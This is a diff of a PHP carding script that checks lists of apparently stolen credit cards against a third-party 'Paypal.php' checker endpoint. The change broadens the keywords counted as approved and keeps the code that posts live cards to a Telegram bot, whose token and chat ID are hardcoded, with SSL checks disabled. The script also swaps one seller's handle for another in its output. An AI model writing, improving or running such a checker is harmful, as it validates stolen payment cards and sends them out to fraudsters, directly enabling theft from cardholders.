@@ -14,7 +14,7 @@ $curlHandles = [];
 
 // Setup curl handles
 foreach ($listas as $i => $lista) {
-    $url = "https://wizvenex.com/Paypal.php?lista=" . urlencode($lista); // 🔁 Replace with your real API
+    $url = "https://wizvenex.com/Paypal.php?lista=" . urlencode($lista); // Replace with your real API
 
     $ch = curl_init($url);
     curl_setopt_array($ch, [
@@ -38,33 +38,39 @@ foreach ($curlHandles as $i => $ch) {
     $response = curl_multi_getcontent($ch);
     $lista    = $listas[$i];
 
-    // Replace @VENEX444 in browser output too
+    // Replace @VENEX444 in browser output
     $responseBrowser = str_replace('@VENEX444', '@STARBOYWTF', $response);
 
-    // ✅ Check if response is NOT DECLINED and NOT INVALID
-    if (stripos($response, "LIVE") !== false && stripos($response, "ADDED") !== false && stripos($response, "APPROVED") !== false) {
-    // your code here
-    // Clean HTML for Telegram + replace VENEX
-    $cleanText = strip_tags($response);
-    $cleanText = str_replace('@VENEX444', '@STARBOYWTF', $cleanText);
+    // ✅ Check for approval keywords
+    $approvalKeywords = ['LIVE', 'APPROVED', 'CARD ADDED', 'ADDED', 'SUCCESS', 'CHARGED', 'AUTH'];
+    $isApproved = false;
 
-    $text = "LIVE ✅\nCC - $lista\nRESULT - $cleanText";
+    foreach ($approvalKeywords as $word) {
+        if (stripos($response, $word) !== false) {
+            $isApproved = true;
+            break;
+        }
+    }
 
-    // Send to Telegram
-    $tg = curl_init();
-    curl_setopt($tg, CURLOPT_URL, "https://api.telegram.org/bot8175217191:AAEIBrGHbHMWp2IF4IsEejYgUqw_k1tcfIk/sendMessage?chat_id=8100683771&text=" . urlencode($text));
-    curl_setopt($tg, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($tg, CURLOPT_SSL_VERIFYPEER, 0);
-    curl_setopt($tg, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_exec($tg);
-    curl_close($tg);
+    if ($isApproved) {
+        $cleanText = strip_tags($response);
+        $cleanText = str_replace('@VENEX444', '@STARBOYWTF', $cleanText);
 
-    // Echo to browser
-    echo "✅ HIT: $lista<br>Response: $responseBrowser<br><br>";
-} else {
-    // Declined or Invalid → only echo
-    echo "❌ DECLINED/INVALID: $lista<br>Response: $responseBrowser<br><br>";
-}
+        $text = "LIVE ✅\nCC - $lista\nRESULT - $cleanText";
+
+        // Send to Telegram
+        $tg = curl_init();
+        curl_setopt($tg, CURLOPT_URL, "https://api.telegram.org/bot8175217191:AAEIBrGHbHMWp2IF4IsEejYgUqw_k1tcfIk/sendMessage?chat_id=8100683771&text=" . urlencode($text));
+        curl_setopt($tg, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($tg, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($tg, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_exec($tg);
+        curl_close($tg);
+
+        echo "✅ HIT: $lista<br>Response: $responseBrowser<br><br>";
+    } else {
+        echo "❌ DECLINED/INVALID: $lista<br>Response: $responseBrowser<br><br>";
+    }
 
     curl_multi_remove_handle($multiHandle, $ch);
     curl_close($ch);
